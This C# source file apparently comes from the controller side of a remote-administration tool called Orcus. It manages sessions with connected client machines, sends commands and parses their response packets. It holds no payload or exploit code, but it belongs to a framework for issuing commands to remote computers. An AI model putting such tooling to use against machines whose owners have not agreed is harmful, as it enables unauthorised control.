using System;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using Orcus.Administration.Core.CommandManagement;
using Orcus.Administration.Core.Logging;
using Orcus.Administration.Plugins.Administration;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Client;
using Orcus.Shared.Communication;
using Orcus.Shared.Connection;

namespace Orcus.Administration.Core
{
    public class ClientController : IClientController
    {
        private ClientConfig _clientConfig;
        private bool _isDisposed;

        public ClientController(OnlineClientInformation clientInformation, Sender sender,
            ConnectionManager connectionManager)
        {
            Commander = new Commander(clientInformation, connectionManager, sender);
            Client = clientInformation;
            ConnectionManager = connectionManager;
            ClientCommands = connectionManager;
        }

        public ConnectionManager ConnectionManager { get; }

        public void Dispose()
        {
            if (_isDisposed)
                return;

            _isDisposed = true;
            try
            {
                ConnectionManager.CloseSession(Client);
            }
            catch (Exception)
            {
                // ignored
            }

            ((Commander) Commander).Dispose();
            Disconnected?.Invoke(this, EventArgs.Empty);
            Logger.Warn((string) Application.Current.Resources["SessionClosed"]);
        }

        public event EventHandler Disconnected;

        public ICommander Commander { get; }
        public OnlineClientInformation Client { get; }
        public IClientCommands ClientCommands { get; }
        public IStaticCommander StaticCommander => ConnectionManager.StaticCommander;
        IConnectionManager IClientController.ConnectionManager => ConnectionManager;

        public async Task<ClientConfig> GetClientConfig()
        {
            return _clientConfig ?? (_clientConfig = await Task.Run(() => ConnectionManager.GetClientConfig(Client)));
        }

        public void PackageReceived(byte parameter, byte[] data, int index)
        {
            switch ((ResponseType) parameter)
            {
                case ResponseType.CommandResponse:
                    if (data.Length - index < 2)
                    {
                        Logger.Fatal((string) Application.Current.Resources["ReceivedTooSmallResponse"]);
                        return;
                    }

                    var finalData = new byte[data.Length - index - 4];
                    Array.Copy(data, index + 4, finalData, 0, finalData.Length);

                    ((Commander) Commander).Receive(BitConverter.ToUInt32(data, index), finalData);
                    break;
                case ResponseType.CommandNotFound:
                    Logger.Fatal((string) Application.Current.Resources["CommandNotFound"]);
                    break;
                case ResponseType.CommandError:
                    Logger.Fatal(string.Format((string) Application.Current.Resources["CommandError"],
                        Encoding.UTF8.GetString(data, index, data.Length - index)));
                    break;
                case ResponseType.StatusUpdate:
                    Logger.Receive(Encoding.UTF8.GetString(data, index, data.Length - index));
                    break;
                default:
                    Logger.Fatal("WTF");
                    return;
            }
        }

        public string DescribePackage(byte parameter, byte[] data, int index)
        {
            var responseType = (ResponseType) parameter;
            if (responseType != ResponseType.CommandResponse)
                return responseType.ToString();

            if (data.Length - index < 2)
                return "CommandResponse (Invalid Length)";

            var finalData = new byte[data.Length - index - 4];
            Array.Copy(data, index + 4, finalData, 0, finalData.Length);

            var commandId = BitConverter.ToUInt32(data, index);
            var result = ((Commander) Commander).DescribePackage(commandId, finalData, true);
            return result ?? $"CommandResponse (CommandId: {commandId})";
        }
    }
}